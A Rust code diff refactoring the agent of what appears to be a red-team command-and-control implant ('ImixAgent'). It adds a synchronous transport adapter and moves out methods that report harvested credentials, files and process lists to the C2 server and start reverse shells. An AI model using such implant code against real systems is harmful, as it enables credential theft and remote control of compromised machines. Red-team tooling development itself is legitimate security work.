@@ -5,7 +5,7 @@ use pb::config::Config;
 use std::collections::{BTreeMap, BTreeSet};
 use std::sync::{Arc, Mutex};
 use tokio::sync::RwLock;
-use transport::Transport;
+use transport::{Transport, SyncTransportAdapter};
 
 use crate::shell::{run_repl_reverse_shell, run_reverse_shell_pty};
 use crate::task::TaskRegistry;
@@ -13,7 +13,7 @@ use crate::task::TaskRegistry;
 #[derive(Clone)]
 pub struct ImixAgent<T: Transport> {
     config: Arc<RwLock<Config>>,
-    transport: Arc<RwLock<T>>,
+    pub transport: Arc<RwLock<T>>,
     callback_uris: Arc<RwLock<Vec<String>>>,
     active_uri_idx: Arc<RwLock<usize>>,
     runtime_handle: tokio::runtime::Handle,
@@ -99,6 +99,12 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
         }
     }
 
+    pub fn report_task_output(&self, req: c2::ReportTaskOutputRequest) -> Result<(), String> {
+        let mut buffer = self.output_buffer.lock().map_err(|e| e.to_string())?;
+        buffer.push(req);
+        Ok(())
+    }
+
     // Helper to get config URIs for creating new transport
     pub async fn get_transport_config(&self) -> (String, Option<String>) {
         let uris = self.callback_uris.read().await;
@@ -165,6 +171,13 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
         self.runtime_handle.block_on(future)
     }
 
+    pub fn get_sync_transport(&self) -> Arc<SyncTransportAdapter<T>> {
+        Arc::new(SyncTransportAdapter::new(
+            self.transport.clone(),
+            self.runtime_handle.clone(),
+        ))
+    }
+
     // Helper to execute an async action with a usable transport, handling setup and errors.
     fn with_transport<F, Fut, R>(&self, action: F) -> Result<R, String>
     where
@@ -215,75 +228,6 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
 
 // Implement the Eldritch Agent Trait
 impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
-    fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String> {
-        self.with_transport(|mut t| async move {
-            // Transport uses std::sync::mpsc::Sender for fetch_asset
-            let (tx, rx) = std::sync::mpsc::channel();
-            t.fetch_asset(req, tx).await?;
-
-            let mut data = Vec::new();
-            while let Ok(resp) = rx.recv() {
-                data.extend(resp.chunk);
-            }
-            Ok(data)
-        })
-    }
-
-    fn report_credential(
-        &self,
-        req: c2::ReportCredentialRequest,
-    ) -> Result<c2::ReportCredentialResponse, String> {
-        self.with_transport(|mut t| async move { t.report_credential(req).await })
-    }
-
-    fn report_file(&self, req: c2::ReportFileRequest) -> Result<c2::ReportFileResponse, String> {
-        self.with_transport(|mut t| async move {
-            // Transport uses std::sync::mpsc::Receiver for report_file
-            let (tx, rx) = std::sync::mpsc::channel();
-            tx.send(req)?;
-            drop(tx);
-            t.report_file(rx).await
-        })
-    }
-
-    fn report_process_list(
-        &self,
-        req: c2::ReportProcessListRequest,
-    ) -> Result<c2::ReportProcessListResponse, String> {
-        self.with_transport(|mut t| async move { t.report_process_list(req).await })
-    }
-
-    fn report_task_output(
-        &self,
-        req: c2::ReportTaskOutputRequest,
-    ) -> Result<c2::ReportTaskOutputResponse, String> {
-        // Buffer output instead of sending immediately
-        let mut buffer = self.output_buffer.lock().map_err(|e| e.to_string())?;
-        buffer.push(req);
-        Ok(c2::ReportTaskOutputResponse {})
-    }
-
-    fn reverse_shell(&self) -> Result<(), String> {
-        Err("Reverse shell not implemented in imixv2 agent yet".to_string())
-    }
-
-    fn start_reverse_shell(&self, task_id: i64, cmd: Option<String>) -> Result<(), String> {
-        self.spawn_subtask(task_id, move |transport| async move {
-            run_reverse_shell_pty(task_id, cmd, transport).await
-        })
-    }
-
-    fn start_repl_reverse_shell(&self, task_id: i64) -> Result<(), String> {
-        let agent = self.clone();
-        self.spawn_subtask(task_id, move |transport| async move {
-            run_repl_reverse_shell(task_id, transport, agent).await
-        })
-    }
-
-    fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse, String> {
-        self.with_transport(|mut t| async move { t.claim_tasks(req).await })
-    }
-
     fn get_config(&self) -> Result<BTreeMap<String, String>, String> {
         let mut map = BTreeMap::new();
         // Blocks on read, but it's fast
